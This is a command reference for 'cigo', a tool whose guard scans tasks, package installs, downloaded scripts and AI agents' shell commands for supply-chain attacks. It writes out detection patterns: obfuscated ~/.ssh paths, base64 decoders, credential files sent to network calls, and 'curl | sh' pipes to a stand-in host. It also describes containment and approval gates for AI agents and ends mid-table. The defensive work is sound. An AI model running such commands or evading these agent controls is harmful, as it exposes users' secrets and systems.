# Commands

```
cigo adopt [--write] [--force] [--depth=N]
cigo list [--all]
cigo run <task>... [--only] [--force] [-- <args for the last task named>]
cigo plan [<task>...] [--only]
cigo show <task>
cigo check
cigo doctor                      (runs `ciginstaller doctor --tools`)
cigo outputs [<task>...]
cigo toolchains [<name>] [--markdown]
cigo guard [setup | scope <1-5> [--yes] | pause [30m] | off | on | allow <program> | log | stats | cache [stats | clear] | uninstall [--yes]]
cigo undo last
cigo run-url <url> [--trust] [-- <args>]
cigo agent [run -- <command> | log | undo --session=<id>|--agent=<name>|--since=2h [--yes]]
cigo scrub show <id>
cigo approve <id>
cigo version
cigo help
```

cigo finds the project the way git does: from any subdirectory, it walks up
to the nearest directory with a `cig-tasks.json` and runs there. `adopt`,
`toolchains`, `help` and `version` work anywhere, and so do `guard`, `undo`, `run-url`, `agent` and `approve`, which run where you are.
From your home folder itself (or `/`), those run from an empty folder of
cigo's own (`~/.cig-orchestrator/here`): cig watches every file in a run's
folder around each step, and your whole home is too much to watch. A guarded
call, an agent's command and `run-url` still run in your home, without the
box and without an undo there; what they write is named (`E752`).

## The commands

**`cigo adopt`** finds every language, task runner and script folder in the
project and prints the manifest it would write (stdout) with a report on what
it found (stderr). `--write` saves it as `cig-tasks.json`; `--force` writes
over an existing one, keeping component names and settings, hand-written
components, and the manifest's tasks, toolchains and defaults. `--depth=N`
looks further down than the default of 3. See [adopting a
project](adopting-a-project.md).

**`cigo list`** shows the components, the stage groups and the tasks, each
with what it runs. `--all` adds the tasks that aren't stages: the rest of a
`package.json`'s scripts, a Makefile's other targets, a script folder's
scripts.

**`cigo run`** runs tasks, dependencies first, each once:

```sh
cigo run test                  # a stage group: every component's test
cigo run api:test web:build    # particular tasks
cigo run ci                    # format-check, lint, check, build and test, everywhere
cigo run release --force       # run tasks that are up to date as well
cigo run --only deploy         # just deploy: its dependencies don't run, so it can't read their values
cigo run scripts:seed -- --count 50    # arguments after -- go to the last task named
cigo run build --no-box        # on the tin instead of in the box, this once
```

A failure stops the run and puts back what it changed (see [cig's
flags](#cigs-own-flags) to keep it instead). On Linux each task runs in
cig's box: over a copy-on-write layer on the project, so a task that cannot
start or is killed leaves nothing behind, and every change a task that ran
made comes back on rollback whether or not `touches` named it. `--no-box`
runs the tasks on the tin instead (`--box` asks for the box where the
default is off); a task's `box`, the manifest's `defaults.box` and
`CIGO_BOX` set the same thing more lastingly ([the
manifest](manifest.md#tasks)). With `--only`, a task that
reads another's output (`{{site.page}}`) needs that task named too, since
values come from the tasks in this run. Before anything starts, a value that
reaches a `shell` or `undo_shell` line unquoted is said, as `cigo check` says
it; `--strict`, or CI, stops the run on it, and a value holding shell syntax
is refused unquoted at substitution either way ([shell lines and
quoting](chaining-languages.md#shell-lines-and-quoting)).

**`cigo plan`** prints the order a run would take and each command, and runs
nothing. With no task names, it plans every task.

**`cigo show <task>`** explains one task: where it came from (a toolchain, a
`package.json` script, the manifest), the command, the directory, what it
needs, whose output it uses, and its options.

**`cigo check`** reads the manifest against the project: unknown keys,
toolchains and components, loops, missing programs and scripts, broken
templates, stage overrides that leave a task with nothing to run, the shape
of each task's `touches`, the conditions, alternatives and vars of the
project's own toolchains, and every version disagreement (below) as a
warning. `--strict` makes a disagreement an error. It changes nothing.

**`cigo doctor`** runs `ciginstaller doctor --tools`, which shows what the
installer owns and, for cigo, the findings of `cigo __doctor --json`, a
hidden, read-only entry that never calls ciginstaller. Each finding is
`{check, severity: ok|note|action, found, because, fix}`. It looks at the cig
this runs under against the range cigo supports; the launcher and the tool it
started; the guard (its level, the shims, the startup-file blocks, whether
the shims come first on this PATH, the agent hook); what `cigo rehearse` can
use here (whether cig's contained box is there, whether Docker or Podman is,
the tool each registry's rehearsal installs with, and how many verdicts and
quarantined rehearsals are kept); and, in a project, each toolchain's tools
on `PATH` and each version against the pins the project keeps (`.nvmrc`,
`.python-version`, `.tool-versions`, `mise.toml`, `rust-toolchain.toml`,
`global.json`, and the minimums in `go.mod` and `build.zig.zon`, among
others), naming the version manager that would run tasks on a pinned
version, and every cig pin the project carries. It changes nothing.

**`cigo versions`** lists each language's pin against this machine: the
pinned version and where it is pinned, the installed one, and the version
manager that would run tasks on the pinned one. `cigo versions switch` says
yes for this project (tasks run on the pinned versions), `cigo versions keep`
says no, both remembered until a pin changes; `cigo versions install` prints
the manager's install command for each pinned version it lacks, and `--yes`
runs them. See [version checks](#version-checks-on-every-command).

**`cigo version`** prints this cigo and the cig it runs on; `--json` adds
the range of cig it supports, whether the installed cig is inside it, and
where the tool is installed.

**`cigo update`** runs `ciginstaller update`, which checks, verifies and
installs the next carton; `--check` only says whether there is one. Updates
come by carton, so there is no cigo version to name: `ciginstaller carton
list` shows them and `ciginstaller update --to <carton>` moves to one. A
cigo running from a git checkout is updated with `git pull` instead, and
`update` says so. The setting `update_channel` (`stable` or `prerelease`)
says which releases cigo's own are considered, and a release listed in the
repository's `YANKED` file is never picked.

**`cigo uninstall`** runs `ciginstaller uninstall cigo`, which first runs
`cigo guard uninstall --yes` when the guard is installed. Your settings and
reports under `~/.cig-orchestrator` stay.

Each of the three finds ciginstaller on `PATH`, then in `$CIGSCRIPT_HOME/bin`,
then in `~/.cigscript/bin`, shows what it prints and exits with its code. With
none of them it says whose job the command is now and how to get
ciginstaller, and exits 127.

**`cigo crash [list|show|send|delete] ...`** runs `ciginstaller crash` with
the same words: `list`, `show <id>`, `send <id>` (or `--all`, `--via`),
`delete <id>` (or `--all`), `--json` passed on as typed. With no word it
lists. The ashtray it reads is cig's, with every tool's reports in it, cigo's
included. See [crash reports](#crash-reports).

**`cigo report [<run>] [--send]`** is the short way in to `ciginstaller bug`,
the one way to report anything. `cigo report <run>` runs `ciginstaller bug
--run <run> --part cigo`, and `cigo report` with no run runs `ciginstaller bug
cigo`; `--send` is passed on. The installer writes the report up, shows
exactly what would be sent before anything is saved, and files it only under
the one consent.

These two find ciginstaller the way the three above do, show what it prints,
exit with its code, and without it say whose job the command is now and how to
get ciginstaller, and exit 127. Until you have it, an issue on the repository
is the way to report something: the [bug
form](https://github.com/otmof-ops/cig-orchestrator/issues/new?template=bug-report.yml).

**`cigo config`** is every setting, read through layers, each later one
winning: the built-in default, the preset, the administrator's
`/etc/cigscript/cigo.conf`, your `~/.cig-orchestrator/config`, the project's
`settings` in `cig-tasks.json`, and `CIGO_<KEY>` in the environment. Three
rules hold: a setting that matters for safety has its values on a scale from
loosest to tightest and **a project may only tighten** (a looser project
value is ignored and `cigo check` says so); the environment loosens a
setting only at a terminal, never under CI, where the `ci` preset applies on
its own; and `key = value !locked` in the administrator's file is final.
`cigo config` lists every setting with where it was set (`--json` for the
layers whole), `cigo config <key>` prints one, `cigo config <key> <value>`
sets it in your file, `--unset` removes it, `cigo config explain <key>` says
what it does, its default, its scale, its presets and its floor, `cigo
config diff` shows what differs from the preset, and `cigo config preset
chill|balanced|strict|paranoid|ci|agent-heavy|research` chooses the bundle
every setting starts from (a looser one is chosen at a terminal). The
settings today: `versions` (`off` < `never` < `ask` < `always`; floored),
`install` (`never` < `ask` < `always`), `security` (`off` < `report` <
`standard` < `strict`; floored), `trust` (`on` < `off`; floored), `osv`
(`off` < `online` < `offline`; floored), `rehearse` (`never` < `auto` <
`always`; floored), `rehearse_use` (`off` < `on`; floored), `verdict_cache` (`on` <
`off`; floored), `rehearse_jobs`, `isolation` (`auto` < `box` < `container` <
`gvisor` < `vm`), `crash_reports` (`always` < `ask` < `never`),
`update_channel` (`prerelease` < `stable`), `issues_repo`, `preset`, and
three of this machine's own, which a project cannot set at all:
`guard_scope` (`project` < `dev` < `downloads` < `agents` < `system`),
`guard_commands`, `guard_agents` and `guard_pause_max` ([the guard's
reach](#the-guards-reach-cigo-guard)), and `agent_approval` (`tty` <
`os-auth` < `never`; floored).

**`cigo outputs`** shows what the last run's tasks handed on; `cigo outputs
stats` shows one task's, as JSON.

**`cigo toolchains`** lists the toolchains cigo knows; `cigo toolchains
rust-cargo` prints one in full (every stage, its alternatives and the
conditions that choose them); `--markdown` writes the table in
[TOOLCHAINS.md](../TOOLCHAINS.md).

## Version checks, on every command

Every command that opens a project looks at the versions it depends on and
says, on stderr, where they disagree:

- the cig this runs under against the range cigo supports (`cigo version
  --json` shows both), and against the cig on `PATH` when they differ, since
  that one runs the tasks that call `cig`;
- the cig against every cig pin the project carries: `.cig-version` at the
  root, `"cig"` in the manifest, and the `# cig` header of each script a task
  hands to `cig run` or a CigScript component holds (written as cig reads
  them: `1.2` is any 1.2.x, `1.2.0` exactly that, `>=1.2.0` that or newer);
- each toolchain's installed version against the pins the project keeps
  (`.nvmrc`, `.python-version`, `go.mod`, `rust-toolchain.toml` and the rest
  of the list under `cigo __doctor`).

The cig pins are files, so `list`, `plan` and `show` read them on every call.
Asking a tool its version is a process, which cig journals as a hop, so
`run` (for the components about to run), `check` and `doctor` ask; `list`,
`plan` and `show` do not. An answer is kept in
`.cig-orchestrator/state/versions.json` with the program's path, size and
time, so a tool is asked again only when it changed and an unchanged project
opens without a hop. `--strict` on `run`, `check` and `doctor` turns a
disagreement into a stop; `CIGO_VERSIONS=0` keeps the warnings quiet.

### The guard: `cigo audit`, `cigo trust`, and what `cigo run` does first

Before a task runs, the guard reads what it is about to run: the command as
written, the scripts it names, for a setup stage the install hooks of the
packages installed here, and each of those packages' README and
`description` for text aimed at an AI agent (`E886`, `E887`). npm packages
are read from `node_modules/`, PyPI distributions from their
`.dist-info/METADATA` in `.venv/` or `venv/`, and crates from `vendor/` or
`target/package/`; what the install has not put on disk is silent, since
the scan never fetches. Against the patterns real attacks use. Each hit is
a finding with a code (`cig explain E873`), the place and the matching
text, scored per category into a risk: `none`, `low`, `medium`, `high`,
`critical`.

Shell text is read twice: as written, and as the shell would join it, with
the simple assignments made earlier in the same text folded in and the
quotes that join pieces taken out, so `d="$HOME/.s""sh"` reads `~/.ssh` and
a host built from parts reads as its address. A network command whose host
the read still cannot see is a finding of its own (`E872`, low; medium for an
upload of a local file), and a hidden folder from the home packed up before
a network command is high. Whatever a decoder is fed (`base64 -d`, `xxd
-r`, `printf '\x…'`, Python's `b64decode`, Node's `Buffer.from(…,
'base64')`, PowerShell's `FromBase64String`) is decoded and read the same
way, three levels deep and within a size cap, and its findings name both
places (`decoded from scripts/x.sh:4`). A command written in escapes,
`$(printf '\x63\x75\x72\x6c')`, `$(echo -e '…')` or `$'…'`, reads as what it
spells. The command a JavaScript or Python script hands to a shell
(`child_process`'s `exec` and `spawn`, `subprocess`, `os.system`) is built
the way the program builds it, string pieces joined, templates, f-strings
and string constants filled in, and read as shell (`run from x.js:3`). A
secret from the environment (`process.env.NPM_TOKEN`, `os.environ[…]`,
`os.getenv(…)`) or a credentials file (`~/.npmrc`, `~/.pypirc`, `~/.netrc`)
that reaches a network call (`https.get`, `fetch`, `requests`, `urlopen`,
`net.connect`) is critical (`E871` and `E872`), unless it goes only to its
own service (`GITHUB_TOKEN` to github.com, `NPM_TOKEN` to npmjs.org). All
of it is text: nothing runs.

```
cigo audit [<task>...] [--json]        the read, with nothing run
cigo audit --sarif | --markdown        the same as a SARIF log for code scanning, or a table for a pull request
cigo audit --offline [<task>...]       the same, with OSV read from this machine's database
cigo blacklist add <thing>             your own entries, refused wherever the guard reads (below)
cigo audit --update-db [<ecosystem>...] fetch OSV's dumps and build that database
cigo trust <task>                      approve a task as it is now (never critical)
cigo trust list | show <task> | revoke <task> | revoke --all
cigo run <task> --accept-risk[=<task>] run a held task once (high needs its name) and approve it
cigo run <task> --run-untrusted=<task> run a refused task anyway, at a terminal
cigo run <task> --no-guard             skip the read (and the rehearsal) for one run
cigo rehearse <package>                check a package before it touches anything (below)
```

What a verdict does depends on `security`: `standard` (the default) refuses
critical, holds medium and high at a terminal until approved, and runs them
with the report unattended; `strict` (the default under CI) also fails high
unattended; `report` says it and runs; `off` does not look. An approval is
one of cig's passes (cig 1.20.0, `cig pass`): it names the task as it is
written (command, environment names) in this project, and the files the
task depends on (the scripts it names; each lockfile beside it and at the
project's root, there or not) are the pass's recorded inputs. Checking it
is one lookup in process per run; a changed byte in any of those files,
or a lockfile that appears, stops it holding, and the task is read again.
Nothing a task runs can make one: in cig's box the keys folder is empty.
`cigo trust list` shows each approval and whether its pass still holds
(and why not); `cigo trust revoke` revokes the pass, and so does `cig pass
revoke --kind approval`, for every approval at once. An approval from
before passes (a record signed with `cig tin mac`) is honored and moved
onto a pass the first time its task runs, the old record put aside under
`trust/retired/`; one that does not verify is a forged approval (`E889`),
ignored and said.

### Known-bad packages: OSV

The packages a task's lockfiles name, at the versions they pin, are checked
against [OSV](https://osv.dev) with the rest of the read: `package-lock.json`,
`npm-shrinkwrap.json`, `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `uv.lock`,
`poetry.lock`, `pdm.lock`, `Pipfile.lock`, a pinned `requirements.txt`,
`Cargo.lock`, `go.sum`, `Gemfile.lock`, `composer.lock`, `gradle.lockfile`
and NuGet's `packages.lock.json`, in the task's folder and the project's.

- A package OSV lists as **malicious** (a `MAL-` advisory, or one whose
  weakness is embedded malicious code, CWE-506 or CWE-912) is `E870`,
  critical: the task is refused before anything is installed.
- A package with a **known vulnerability** is `E885`, one line per package
  with the worst severity, the advisories, and the version that fixes all
  of them when OSV names one. It is reported, and holds nothing.

```
osv = online    (default) one batched question to OSV per run that needs it
osv = offline   the database cigo audit --update-db built; nothing leaves the machine
osv = off       not checked
```

Online, only each package's ecosystem, name and version are sent, never a
path or a project's name; an answer naming advisories is kept a day and a
clean one an hour, under `~/.cig-orchestrator/osv/`. When OSV cannot be
reached, the run says so once and goes on with the rest of the guard.
Offline, `cigo audit --update-db` downloads OSV's dump for each ecosystem the
project uses (or the ones named: `npm`, `PyPI`, `crates.io`, `Go`,
`RubyGems`, `Packagist`, `Maven`, `NuGet`), keeps the versions and ranges
its advisories name, and throws the dump away; npm's is about 200 MB to
fetch. The database is as fresh as its last update; run it again to catch
what was reported since. `osv` is floored, and `offline` is the tightest:
a project cannot send its packages to OSV when you chose not to.

### Typosquats and registry metadata

Next to the OSV read, four more cheap signals come from the packages a task's
lockfiles name:

- `E881` **a typosquat**, medium: the package's name is within a letter or
  two of a popular one in its ecosystem. The popular one is named in the
  finding (`reqeusts` is reported as one letter from `requests`). The list
  of top names is bundled per ecosystem, composed from each registry's
  public download-count rankings, and covers npm, PyPI and crates.io.
- `E882` **brand new, or a new publisher**, medium: this version was
  published in the last `metadata_young_days` days (default 7). `0`
  turns the window off without turning the other two checks off.
- `E883` **a new install script**, high: the previous version ran nothing
  at install, this one runs a `preinstall`/`install`/`postinstall`
  (npm). Most real supply-chain attacks are a bad update to a good
  package, which is the question that catches them. PyPI and crates.io
  do not expose install-script changes in the registry JSON, so `E883`
  is asserted for npm only here; the rehearsal observes it when run.
- `E884` **no label on the pack**, low: no source repository is linked
  on the registry.

```
registry_meta = off       (default) not checked: no request is made
registry_meta = online    the ecosystem's own registry asked once per
                          package a task's lockfiles name, kept a day
                          under ~/.cig-orchestrator/registry (the
                          paranoid preset turns it on)
metadata_young_days = 7   the E882 window, in days (0 turns E882 off)
```

Each name is asked once: only the name, never a path or the project's own.
A test points `CIGO_REGISTRY_NPM`, `CIGO_REGISTRY_PYPI` and
`CIGO_REGISTRY_CRATES` at a `file://` directory of fixture responses, the
way the OSV online test does with `CIGO_OSV_API`. `registry_meta` is
floored: a project cannot ask the registry when you chose not to.

### Your blacklist: `cigo blacklist`

What you never want installed, fetched or run again, refused wherever the
guard reads (`E580`, critical): in a task's lockfiles, in the scripts it
names, in the URLs its text holds, by `cigo rehearse` and by `rehearse
--changed`.

```
cigo blacklist add npm:colors-plus@2.4.1     a package version (npm:colors-plus for every version)
cigo blacklist add pypi:requestz==2.0.1      pypi, crates, go, gem, composer, maven and nuget the same way
cigo blacklist add ./suspicious.bin          a file, by its sha256 (or sha256:<hex>)
cigo blacklist add evil.example.com          a domain and its subdomains
cigo blacklist add 45.12.0.0/16              an IPv4 range
cigo blacklist add 'https://get.bad.test/*'  URLs by pattern
         ... --reason="phished our team" --expires=90d
cigo blacklist list [--json]                 every entry, its reason, and whether it is signed
cigo blacklist why <package|file|url|host>   which entry matched and why (exits 1 when one did)
cigo blacklist remove <entry>                as list shows it
cigo blacklist reload                        sign a list you edited by hand, at a terminal
cigo blacklist allow <entry> --reason=...    override a false positive (OS-authenticated)
cigo blacklist unallow <entry>               take the override back (OS-authenticated)
cigo blacklist allows [--json]               every override, who, when and why
cigo blacklist export <file>                 one signed bundle (your entries and overrides)
cigo blacklist import <file>                 merge a signed bundle (OS-authenticated)
cigo blacklist exceptions [--json]           the one-off runs in force (blacklist_exception_ttl)
```

The entries live one per line in `~/.config/cigscript/blacklist.d/mine.list`
(`#` starts the reason, `expires=2027-03-01` ends it), held by one of
cig's passes over its bytes, named beside it in `mine.list.pass` (a list
from before passes, signed with `cig tin mac`, moves onto a pass the
first time it is read). A list changed by anything but `cigo blacklist`
does not verify: the run says so (`E587`), and its entries still count
together with the last copy of it that verified. Taking an entry out of the
file therefore lets nothing through, until you sign the change with `cigo
blacklist reload`, which shows what changed and is refused under CI. The
last list that verified is also kept in the tin (`cig tin keep`, cig
1.14.0), for the folder it was kept from, and each keep is a line in the
ledger: delete the list and its
signature together, or cigo's own copy too, and its entries still count in
full from the tin, said on every guarded call (`E588`) until `cigo blacklist
reload` puts the file back. A missing or emptied list never takes entries
out; only `remove` and `reload` do. Inside
cig's box the key folder is empty, so a task cannot sign a list. An expired
entry stays listed and no longer refuses anything.

Overriding a false positive is `cigo blacklist allow <entry> --reason=...`,
OS-authenticated so a script cannot whitelist its own payload. The override
lives in `~/.config/cigscript/blacklist.d/allows.jsonl`, signed with the
tin's key under a separate label, and records who allowed it and when; the
entry stays on the list and `cigo blacklist why <thing>` names the override
next to the entry it nullifies. `cigo blacklist unallow <entry>` takes it
back (also OS-authenticated).

`cigo blacklist export <file>` writes your own entries and overrides as one
signed JSON bundle (`<file>` and `<file>.mac`, signed under its own tin
label). `cigo blacklist import <file>` is OS-authenticated and refuses any
bundle that does not verify (`E587`), including an unsigned one; it merges
what the bundle names into the local lists, skipping anything already there.
Imported entries keep their source, so a bundle signed on another machine
that shares the tin's key imports here cleanly.

Running something blacklisted anyway goes through two warnings and OS
authentication:

```
cigo run <task>                                    warning one (E580): what it is
cigo run <task> --run-untrusted=<task>             warning two (E581): what it could cost
cigo run <task> --run-untrusted=<task> --light-it  OS authentication, honours blacklist_unboxed
```

With `blacklist_unboxed = refuse` (the default) the flow ends in a refuse
that points to the setting: the box itself is CigScript#106 and is not
built yet. With `blacklist_unboxed = ask`, add `--no-box` for a second OS
authentication and run outside the box (`E583`); the approval is recorded
in `~/.cig-orchestrator/blacklist-exceptions.jsonl` and lasts
`blacklist_exception_ttl` (default 24h), so a re-run in that window does
not ask again (`E582`). Agents and CI never approve a blacklisted run
(`E895`), whatever the setting says. The built-in signed bundle cigo will
ship, program starts, connections and DNS come with #62's later steps.

### The guard's reach: `cigo guard`

One setting, `guard_scope`, decides how much of this machine goes through
the guard. Each level adds to the one below it:

| level | name | what goes through the guard |
|---|---|---|
| 1 | `project` | `cigo run`, as above (the default) |
| 2 | `dev` | also every package manager and its scripts, in any folder: `npm install`, `npx`, `pip install`, `uvx`, `cargo build`, `go install`, `gem install`, `composer require` and the rest |
| 3 | `downloads` | also the first shell run of a file the browser marked as downloaded (the `user.xdg.origin.url` attribute) or a file under `~/Downloads`, rehearsed first (`E893`); shims for `tar`, `unzip` and `7z` carry the mark onto what they extract |
| 4 | `agents` | every shell command your AI agents run |
| 5 | `system` | not built yet: everything the machine runs |

```
cigo guard                    the level, what is installed for it, the last few guarded calls (--json)
cigo guard setup              the question, with the levels to choose from
cigo guard scope <1-5|name>   what going to that level would change; --yes makes the change
cigo guard pause [30m]        the guarded calls run unguarded until then (at most guard_pause_max, 8h)
cigo guard off | on           unguarded until you turn it back on
cigo guard allow <program>    that program is not read any more (its shim goes)
cigo guard allow <file|sha256> those bytes are not rehearsed again (run-url, the hook): a script you have read
cigo guard log [--all|--json] what was guarded, and what came of it
cigo guard stats [--since=30d] [--json]
                              the log counted: prompts per day, per kind, per code; the verdict cache's
                              hit rate per day (a dash for a day with no lookups); for asks and gates,
                              approved yes / declined / left; and how often a notice was followed by a
                              change of setting
cigo guard cache [stats | clear] [--json]
                              the verdict cache: how often an agent's command was read from it, and
                              clear to read every command again
cigo guard check-line [--json] one command line from stdin, read as the agent hook reads it: the
                              findings, the risk, the tier, and whether the read came from the cache
cigo guard tier [<risk> [<c>]] the tier matrix (risk × confidence → silent/notice/ask/gate), the whole table, one row or one cell
cigo guard uninstall          every shim and startup-file block it wrote, removed; --yes does it
cigo undo last                the newest guarded call, taken back (cig unburn of its run)
cigo run-url <url> [--trust]  the safe way to curl | sh (below)
cigo quarantine [show <sha256> | clear [--all]]  what run-url downloaded, read again or cleared
```

The installer asks once, by printing the question and the command that
answers it; `cigo guard setup` asks again. Nothing outside cigo changes
without a yes: `cigo guard scope dev` lists the files it would write, and
`--yes` writes them.

**Which shells.** At level 2 and up, the guard's block goes into every
shell's startup file it finds (`~/.bashrc`, `~/.zshrc`, `~/.profile`,
`~/.bash_profile`, `~/.zprofile`, and a `conf.d` file for fish).
`guard_shells` (comma-separated: `bash`, `zsh`, `sh` for `~/.profile`,
`fish`) narrows that to the shells it names. A named shell with no startup
file gets its usual one, and a shell it leaves out loses its block at the
next `cigo guard scope … --yes`.

**Allowing bytes.** `cigo guard allow ./install.sh`, or its sha256, keeps a
signed allowance under `~/.cig-orchestrator/allowed/`: `cigo run-url` (and
so the shell's `curl | sh` hook) runs those exact bytes without a rehearsal,
whatever cigo's version, as `--trust` does for one run. The read and your
blacklist still apply, and one byte more is another script. An allowance
that does not verify under the tin's key is ignored, and said.

**Level 2 is shims.** `~/.cig-orchestrator/shims/` holds a small `sh`
script for each program `guard_commands` names (npm, npx, pnpm, yarn, bun,
bunx, pip, pip3, pipx, uv, uvx, poetry, cargo, go, gem, bundle, composer,
dotnet, deno), and one block in each startup file you have (`~/.bashrc`,
`~/.zshrc`, `~/.profile`, `~/.bash_profile`, `~/.zprofile`; fish gets
`conf.d/cigo-guard.fish`) puts the folder first on `PATH`:

```sh
# >>> cigo guard >>> (written by cigo; cigo guard uninstall removes this)
case ":$PATH:" in *:/home/you/.cig-orchestrator/shims:*) ;; *) PATH=/home/you/.cig-orchestrator/shims":$PATH"; export PATH ;; esac
# <<< cigo guard <<<
```

A shim finds the real program (the next one on `PATH` after the shims) and
looks at the first word that is not a flag. A call that cannot run anyone
else's code (`npm test`, `cargo fmt`, `pip list`) runs the real program at
once, without starting cig: about a millisecond, and the suite holds it
under 5 ms. A call that can (`npm install`, `npm ci`, `npx`, `pip install`,
`uv add`, `uv pip install`, `cargo build`, `cargo install`, `go install`,
`deno run https://...`) goes to `cigo guard exec`, which treats it as a
task made on the spot, in the folder you called it from:

1. Your blacklist and, at exact versions, OSV, for each package the call
   names; the static read and OSV for the folder's lockfiles. Critical
   refuses it before it starts.
2. A call that only installs what a lockfile already says, approved before
   as it is (`npm ci` on the same `package-lock.json`), runs at once.
3. Otherwise, on Linux with cig's contained box, it is rehearsed: it runs
   for real in the box, its output shown as it goes, its writes held and
   judged against its toolchain's footprint, its network only the
   registries. What it wrote in the folder is then applied as it was (no
   second run), journaled, so `cigo undo last` takes it out again. An
   install into your home (`npm install -g`, `cargo install`, `pip install
   --user`, `pipx`, `uv tool`) is installed for real after a clean
   rehearsal, since the box never hands back what lands in your home.
4. The verdict's friction is a task's: none and low go on; medium and high
   are held at a terminal (`CIGO_ACCEPT_RISK=1 npm install ...` runs it
   once) and go on unattended unless `security = strict` and it is high;
   critical is refused (`CIGO_RUN_UNTRUSTED=1`, at a terminal only).

**`curl | sh`, at the prompt.** Level 2 also gives an interactive bash (4
or later) and zsh a hook on the Enter key, loaded by the same block. A line
that pipes a download into a shell or an interpreter (`curl ... | sh`,
`wget -qO- ... | sudo bash`, `bash <(curl ...)`, `sh -c "$(curl ...)"`) is
cancelled before it starts and kept in your history to edit:

```
E892 not smoking something a stranger handed you through the window.
  curl -fsSL https://get.example.dev/install.sh | sh
  runs whatever that server sends today; nothing ran (it is in your history to edit).
  rehearse it first: cigo run-url https://get.example.dev/install.sh
```

The hook binds Enter through readline (bash) or zle (zsh): it sets no trap,
and no other command runs any differently. Paused or off, the line goes
through; `CIGO_GUARD_HOOK=0` turns it off in one shell.

**`cigo run-url <url> [-- <args>]`** is the safe way: the script is
downloaded into `~/.cig-orchestrator/quarantine/` (never run from the
pipe), checked against your blacklist (the URL and its host before
anything is fetched, then the bytes) and read against the rules, then
rehearsed in cig's contained box with the URL's own host as its only
network, and the verdict shown with everything it did. Allowed, it runs for
real over the folder you are in, in the box on Linux, its output shown as it
goes; held at medium or high (`--accept-risk` runs it), refused as critical
(`--run-untrusted`, at a terminal). The same bytes are never rehearsed
twice: the verdict is kept by their sha256, signed, and `--trust` runs them
without the rehearsal and keeps that. Like `cigo rehearse`, it runs in a
project or an empty folder rather than your home, since the box lays over
the folder you are in.

**`cigo quarantine`** lists what run-url downloaded, newest first: its
sha256, size, when, and the URL it came from. `cigo quarantine show
<sha256>` reads one again against the rules and your blacklist and says the
verdict with each finding, without running it, and the command that runs
it rehearsed first. `cigo quarantine clear` removes what is older than
`quarantine_keep_days` (30; 0 keeps everything), and `--all` everything.

Paused or off, a shim says so on every guarded call (`E896`) and runs the
real program. An install script that runs a package manager again inside a
guarded call (`CIGO_GUARDED` is set for it) gets the real one.

Where it does not reach, said plainly: a program called by its full path
skips its shim, and a version manager that puts its own folder first on
`PATH` at every prompt (`mise activate`) can come before the shims;
`cigo guard` and `ciginstaller doctor --tools` say whether the shims come first in the
shell you are in. Level 2's shims are `sh` scripts, so on Windows they come
later; `cigo run` stays guarded there.

### `cigo guard cache`: the read of a command, remembered

An agent's session repeats itself: the same `git status`, the same test
run, dozens of times. The guard's read of a command line an agent runs
(the Claude Code hook, and `cigo agent run`) is kept as one of cig's
`verdict` passes. It is about the line exactly as written and this
cigo's version, and it also records this cigo's own source and the rules
the read used, so a new release, a changed rule or one byte of another
line is read afresh. A hit gives exactly the findings a fresh read gives.

- Only the scan of the line is kept. Your blacklist is read live on every
  call, and what a person says to an ask is never answered from the cache.
- Each verdict lasts a week. It holds the command line as written, in
  cig's keys folder, which the box hides from every hop. The guard log
  keeps the same line redacted.
- `cigo guard cache stats` counts the verdicts kept and, from the guard
  log, how many reads came from the cache in the last 30 days (each agent
  event in the log carries `cache: hit`, `miss` or `none`).
- `cigo guard cache clear` revokes every verdict pass (`cig pass revoke
  --kind verdict`): the next read of each command, and of each kept
  rehearsal verdict, is made again.
- `cigo guard check-line` reads one line from stdin as the hook would and
  says what it found, and whether the read came from the cache. The suite
  holds the cache to it: every sample of the detection corpus, read as a
  command line, gives the same findings from the cache as from a fresh read.

### `cigo guard stats`: the guard measures its own noise

A prompt that is always answered the same way is noise. `cigo guard stats`
reads the guard log and counts, over a window (`--since=30d` by default):

- prompts per day (by the UTC date), split by tier (ask, gate, notice,
  refused);
- events per `kind` (`guarded`, `run-url`, `agent`, `approve`,
  `blacklist-light-it`, `config`...);
- events per code (`E580`, `E870`, `E874`, `E887`...), from each event's
  findings;
- for asks and gates, how often each was approved (yes), declined (no) or
  left (no answer, held or still waiting), and how many the log holds no
  answer for (`unrecorded`: say, a high finding that ran because
  `--accept-risk` answered it on the command line);
- how often a notice was followed by a change of a guard-related setting
  (`security`, `rehearse`, `guard_scope`, `blacklist_unboxed`,
  `agent_approval`, the preset, ...).

`--json` prints the same numbers for a script. An empty window says so in
one line and exits 0.

```
cigo guard stats --since=7d
guard: 22 events in the last 7 days (6 ask, 3 gate, 4 notice, 2 refused)

per day (UTC)
  2026-11-02    2 ask    0 gate    1 notice    0 refused
  2026-11-05    1 ask    1 gate    2 notice    1 refused
  ...

asks     3 yes  1 no  2 left
gates    2 yes  1 no  0 left

1 of 1 change of a guard setting followed a notice
```

The log adds two small records to make the count honest: an event that
ended a prompt carries a `decision` field (`yes` / `no` / `left`), and a
change to a guard setting lands as a `config` event in the log. Lines
written by an older cigo without these fields have their decision read
from the outcome, so nothing in the old log is guessed at: it either
counts cleanly or its answer is counted as `unrecorded`. The tier comes
from the tier matrix: a run that went ahead with no prompt recorded is a
notice at medium, an ask at high and a gate at critical.

### Level 4: what your AI agents run

At `guard_scope agents`, every shell command an agent runs goes through
`cigo agent run`:

1. It is read first: the static read's rules and your blacklist for any
   URL it names. A command that would change the guard's own files is
   refused outright (`E897`, below).
2. On Linux it runs in cig's **contained** box, the one the rehearsal uses:
   what it changes in the project comes back with undo, and what it writes
   in your home is held and judged by where it landed:
   - **the guard's own files** (Claude Code's settings where the hook
     lives, `~/.config/cigscript`, cig's state and the tin, cigo's folder
     and the shims, cig's and cigo's own install folders): refused, `E897`,
     and never applied, approval or not;
   - **a shell's startup file, a git hook, an autostart entry, a
     credential file**: nothing of the command is applied, and it waits
     for a person (`E894`); approved, the same command run again lands;
   - **anything else in your home** (a tool's cache, its own config):
     applied as it was, and named after the output.

   Its network is the registries every toolchain's footprint names and the
   project's own git remotes; a host outside them is refused, and a command
   that failed for it waits for a person, who approves it with the hosts
   named. Called from your home folder itself, the box takes it all the
   same. Where the contained box cannot be had (not Linux, root, no user
   namespaces), the plain box runs it and says so. The project's manifests
   and lockfiles are kept in the tin first on every OS.
3. It is recorded as a run tagged with the agent and its session.

The verdict decides who answers: the guard reads the risk of the command
(none, low, medium, high, critical) and the confidence it has in that
reading (exact for a blacklist hit the user named, high for a heavy
pattern or a known-bad package, medium or low for lighter ones), and
reads the tier the user sees from one table:

| | exact | high | medium | low |
|---|---|---|---|---|
